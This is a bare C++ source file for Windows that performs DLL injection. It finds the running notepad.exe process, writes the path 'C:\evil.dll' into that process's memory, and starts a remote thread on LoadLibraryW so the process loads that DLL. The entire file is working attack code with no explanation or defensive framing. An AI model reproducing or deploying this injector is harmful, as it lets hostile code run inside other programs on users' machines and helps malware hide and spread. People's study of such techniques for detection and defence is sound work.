#include <Windows.h>
#include <TlHelp32.h>
#include <cstdio>

const wchar_t dllPath[] = TEXT("C:\\evil.dll");

DWORD EnumTargetProcess(LPCWSTR procname)
{
	PROCESSENTRY32W proc = { proc.dwSize = sizeof(PROCESSENTRY32W) };
	HANDLE hSnap = NULL;
	int pid = 0;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (INVALID_HANDLE_VALUE == hSnap) return 0;

	do
	{
		if (lstrcmpiW(procname, proc.szExeFile) == 0)
		{
			pid = proc.th32ProcessID;
			break;
		}

	} while (Process32NextW(hSnap, &proc));

	return pid;
}


int main(void) 
{
	DWORD targetPid = EnumTargetProcess(L"notepad.exe");

	if (targetPid != 0)
	{
		HANDLE hProc;
		PVOID rbuff;

		PVOID lb = GetProcAddress(GetModuleHandleW(L"Kernel32.dll"), "LoadLibraryW");

		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
		rbuff = VirtualAllocEx(hProc, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(hProc, rbuff, (LPVOID)dllPath, sizeof dllPath, NULL);
		CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rbuff, 0, NULL);
		CloseHandle(hProc);
		return 0;
	}

	return 1;
}
